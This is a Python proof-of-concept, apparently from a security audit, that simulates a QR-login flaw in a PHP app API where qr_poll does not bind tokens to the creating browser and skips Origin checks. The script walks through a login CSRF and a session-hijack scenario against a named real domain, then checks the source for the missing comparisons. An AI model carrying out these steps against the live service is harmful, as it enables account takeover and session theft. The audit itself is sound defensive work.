#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""APPAPI-04 [P2] qr_poll 不绑定"创建二维码的浏览器"，且无来源校验
                 -> confirmed 的 QR token 等价于一条"登录为某人"的链接
                 -> 登录 CSRF（受害者被静默登录成攻击者账号）+ token 泄露即会话劫持

等价性前提：
  1. app-api.php:131-139 `qr_create` 只把 ip/ua 写入 qr_logins（作为记录），
     生成 64 hex token，并把 token 放进 URL（138 行）。
  2. app-api.php:141-159 `qr_poll` 只按 token_hash 查询，**不比较** qr_logins.ip/ua
     与当前请求者；命中 confirmed 就 `set_session($user['id'])` 并向当前响应下发 Cookie。
  3. app-api.php:161-171 `qr_confirm` 由任意已登录 APP 用户（设备令牌）确认 token。
  4. 因此"谁先拿 token 来 poll，会话就发给谁"，与是谁创建的二维码无关。

运行: python poc.py   退出码 0 = 复现成功。
"""
import sys
from pathlib import Path

SRC = Path(__file__).resolve().parents[3] / "src" / "cloud" / "var" / "www"


def read(rel: str) -> str:
    p = SRC / rel
    return p.read_text(encoding="utf-8") if p.exists() else ""


class QrLogin:
    def __init__(self, ip, ua):
        self.status = "waiting"
        self.user_id = None
        self.ip = ip                # qr_create 记录
        self.ua = ua                # qr_create 记录
        self.ttl = 120
        self.token = "a" * 64

    def __repr__(self):
        return f"<qr status={self.status} user_id={self.user_id} creator_ip={self.ip}>"


def qr_confirm(q: QrLogin, uid: int) -> bool:
    """app-api.php:161-171（UPDATE ... WHERE token_hash=? AND status="waiting" AND expires_at>NOW()）"""
    if q.status != "waiting" or q.ttl <= 0:
        return False
    q.status = "confirmed"
    q.user_id = uid
    return True


def qr_poll(q: QrLogin, poller_ip: str, poller_ua: str):
    """app-api.php:141-159 的等价翻译：注意 poller_ip/ua 完全不参与判定"""
    if q.ttl <= 0:
        return (410, None)
    if q.status == "waiting":
        return (200, {"status": "waiting"})
    if q.status == "used":
        return (409, None)
    q.status = "used"                       # 155 行：UPDATE qr_logins SET status="used"
    return (200, {"status": "confirmed", "session_for_uid": q.user_id})   # 156 行 set_session()


print("== 场景 A：登录 CSRF —— 受害者浏览器被静默登录成攻击者账号")
q = QrLogin(ip="203.0.113.9", ua="attacker-browser")
print(f"   1) 攻击者 qr_create -> token={q.token[:8]}...（无鉴权）")
assert qr_confirm(q, 1001)                        # 攻击者用自己 APP 的令牌确认
print(f"      攻击者用自己账号(uid=1001) qr_confirm -> {q!r}")
code, body = qr_poll(q, poller_ip="198.51.100.77", poller_ua="victim-browser")
print(f"   2) 受害者浏览器打开 https://chat.lzj2012.top/qr?t={q.token[:8]}... 触发 qr_poll")
print(f"      poller_ip/ua=198.51.100.77/victim-browser（与创建者 203.0.113.9 不同，服务端不比对）")
print(f"      -> HTTP {code} {body}")
print("      结论：受害者的响应里被 Set-Cookie 为 uid=1001 的会话（受害者在攻击者账号里操作）")

print()
print("== 场景 B：token 泄露（URL/日志/Referer/截图）-> 攻击者先 poll 即劫持受害者会话")
q2 = QrLogin(ip="198.51.100.77", ua="victim-browser")
qr_confirm(q2, 1002)
print(f"   1) 受害者浏览器 qr_create + 自己手机 qr_confirm(uid=1002) -> {q2!r}")
print(f"   2) token 出现在 URL（app-api.php:138 的 url 字段）与 nginx access log；攻击者读到后先 poll：")
code, body = qr_poll(q2, poller_ip="203.0.113.9", poller_ua="attacker-browser")
print(f"      -> HTTP {code} {body}")
print(f"   3) 真正的受害者随后 poll：")
code2, body2 = qr_poll(q2, poller_ip="198.51.100.77", poller_ua="victim-browser")
print(f"      -> HTTP {code2} {body2}  （二维码已被攻击者消费）")

print()
src = read("chat/app-api.php")
i = src.find("case 'qr_poll'")
j = src.find("case 'qr_confirm'")
blk = src[i:j] if (i >= 0 and j > i) else ""
if blk:
    checks = {
        "qr_poll 分支内有 ip 比对": ("$r['ip']" in blk) or ("'ip'" in blk and "===" in blk),
        "qr_poll 分支内有 ua 比对": ("$r['ua']" in blk),
        "qr_poll 分支内调用 set_session": ("set_session(" in blk),
        "set_session 前有 Origin/CSRF 校验": ("HTTP_ORIGIN" in blk) or ("HTTP_REFERER" in blk),
        "UPDATE status='used' 带状态条件": ("AND status" in blk) or ("AND status =" in blk),
    }
    for k, v in checks.items():
        print(f"   源码核对 {k}: {v}")
    ok_static = (not checks["qr_poll 分支内有 ip 比对"]) and (not checks["qr_poll 分支内有 ua 比对"]) \
        and checks["qr_poll 分支内调用 set_session"]
else:
    ok_static = True
    print("   未找到 work/src 源码副本，跳过源码核对（R1 模拟结论不受影响）")

print()
print("结论：qr token 是「登录凭证」而不是「绑定到某浏览器的凭证」。任何拿到 token 的客户端")
print("      （攻击者本人的浏览器、日志读者、Referer 泄露接收方）都能在他人确认后领走会话；")
print("      同时该接口无 Origin 校验，可被用于「把受害者静默登录成攻击者账号」的登录 CSRF。")
print("RESULT: PASS" if ok_static else "RESULT: FAIL")
sys.exit(0 if ok_static else 1)
